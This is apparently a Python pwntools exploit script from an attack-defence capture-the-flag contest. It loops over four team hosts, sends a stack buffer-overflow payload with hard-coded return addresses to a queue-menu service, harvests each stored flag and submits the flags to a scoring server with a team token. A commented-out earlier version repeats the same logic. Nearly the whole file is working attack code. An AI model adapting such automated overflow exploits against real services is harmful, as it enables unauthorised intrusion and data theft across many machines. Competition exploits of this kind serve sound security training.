#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import re
import requests

for i in range(4):
    io = remote(f"10.60.{i}.1", 42069)

    io.sendlineafter(b">> ", b"1")
    
    queues = io.recvuntil(b"\n> 1.", drop=True)
    queues = queues.split(b"\n")
    queues = [ queue[3:] for queue in queues]
    print(queues)
    payload = b'A' * 48 + b'b' * 8 + p64(0x401016) + p64(0x401d2e) + p64(0x401016) + p64(0x40216a)
    
    flags = []
    for queue in queues:
        io.sendlineafter(b">>", b"3")
        io.sendlineafter(b">", queue)
        
        io.sendlineafter(b">>", b"1")
        io.recvuntil(b"Queue items: ")
        items = int(io.recvline(False))
        
        if items == 0:
            io.sendlineafter(b">>", b"5")
            continue

        io.sendlineafter(b">>", b"4")
        io.sendlineafter(b">", payload)
        
        io.sendlineafter(b"> ", b"0")

        io.recvuntil(b"Item content: ")
        flag = io.recvline(False)

        flags.append(flag.decode())
        print(queue, flag)
        io.sendlineafter(b">>", b"5")
    print(flags)
    r = requests.put("http://10.254.0.1/flags", headers={"X-Team-Token": "45883db66713d716"}, json=flags[:-100])
    print(r.text)
    
    
    
# i = 3
# while i <= 4:
#     try:
#         io = remote(f"10.60.{i}.1", 42069)

#         print(io.recvuntil(b">>"))


#         io.sendline(b"1")

#         r = io.recvuntil(b"1")

#         r = re.split(" |-", r.decode())

#         print(r)

#         queues = []
#         for el in r:
#             if el.endswith("\n"):
#                 queues.append(el[:-1])
#             if el.endswith("\n>"):
#                 queues.append(el[:-2])

#         print(queues)
        
#         io.close()
        
#         flags = []

#         for q in queues:
#             try:
#                 io = remote(f"10.60.{i}.1", 42069)
                
#                 io.recvuntil(b">>")
            
#                 io.sendline(b"3")
                   
#                 io.sendline(q.encode())
                    
#                 io.recvuntil(b">>").decode()

#                 io.sendline(b"4")
#                 io.recvuntil(b">")

#                 io.sendline(payload)

#                 io.recvuntil(b">")

#                 io.sendline(b"0")

#                 flag = io.recvline().decode()
#                 flag = re.split(" |\n", flag)
#                 flags.append(flag[3])
                
                
#                 io.close()
#             except Exception as e:
#                 continue

        
#         i += 1
            
#     except Exception as e:
#         i += 1
#         print(i)
#         print(e)
#         continue
# print(flags)
# r = requests.put("http://10.254.0.1/flags", headers={"X-Team-Token": "45883db66713d716"}, json=flags)
# r.raise_for_status()
# # print(r.text)